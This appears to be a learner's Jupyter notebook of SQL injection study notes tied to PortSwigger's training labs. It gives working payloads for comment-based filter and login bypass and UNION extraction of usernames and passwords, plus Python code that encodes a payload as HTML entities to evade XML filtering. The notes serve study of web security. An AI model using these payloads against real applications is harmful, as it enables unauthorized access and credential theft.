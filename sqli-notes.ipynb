{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Commenting"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "insecure-website.com/products?category=Gifts\n",
    "- lets say its sending a query 'SELECT ALL products WHERE category = 'gifts' AND released = 1\n",
    "- where its showing gift products that ARE released (unreleased would have released = 0)\n",
    "    SQLI\n",
    "        insecure-website.com/products?category=Gifts'--\n",
    "        '-- is a comment so the SQL query is  'SELECT ALL products WHERE category = 'gifts'\n",
    "        the AND statement is canceled and you see all products\n",
    "\n",
    "        insecure-website.com/products?category=Gifts'+OR+1=1--\n",
    "        you are returning all product where either category = gifts OR 1=1, so you return all products\n",
    "\n",
    "user-login - if there is a un/pw queried and the query is return signals successful login:\n",
    "    SQLi \n",
    "        send in username=administer'--\n",
    "        SELECT * FROM users WHERE username = 'administrator'--' AND password = ''\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### UNION other tables"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "union other tables\n",
    "    if a query is returning product details from a table:\n",
    "        SELECT name, description FROM products WHERE category = 'Gifts'\n",
    "    ' UNION SELECT username, password FROM users--\n",
    "        will return un/pw along with product descriptions"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Blind injections"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "if the application doesnt return results of hte query or info about errors in responses, we're blind\n",
    "    we might be able to detect differences in the response still by\n",
    "        -new condition for Bool logic, or error with 1/0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Second order or stored SQLi"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- First order - when app processes user input from HTTP request and incorporates into SQL query in unsafe way\n",
    "- Second order - when app takes user input from HTTP request and stores for future - put into database\n",
    "    - when its retrieved later and incorparated into query, then it's second order"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Examining Database"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "    SELECT * FROM v$version \n",
    "- on oracle - see version details"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "    SELECT * FROM information_schema.tables\n",
    "- list tables"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Finding the number of columns in tables"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- if you have XML/JSON/URL, you have first check 1+1 to see if it evaluates to 2, if yes, SQL\n",
    "- if you have an idea of the other table you are querying from:\n",
    "- have the original query + UNION SELECT NULL - if this gives a valid return, but NULL, NULL does not, the table you are selecting from only has 1 column\n",
    "- if UNION SELECT NULL, NULL gives an expected value, but the others dont, table has 2 columns\n",
    "- XML may scrub the query, so you can encode as hex/dec with the code below\n",
    "> be careful with ' vs \" in the variable titles - ' worked for us"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [],
   "source": [
    "def ch_hex(ch):\n",
    "    return '&#x{:X};'.format(ord(ch))\n",
    "\n",
    "def ch_dec(ch):\n",
    "    return '&#{};'.format(ord(ch))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#124;&#124;&#32;&#39;&#126;&#39;&#32;&#124;&#124;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;\n"
     ]
    }
   ],
   "source": [
    "query = \"1 UNION SELECT username || '~' || password FROM users\"\n",
    "enc_query = []\n",
    "for x in query:\n",
    "    enc_query.append(ch_dec(x))\n",
    "print(''.join(enc_query))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "https://portswigger.net/web-security/sql-injection/examining-the-database"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
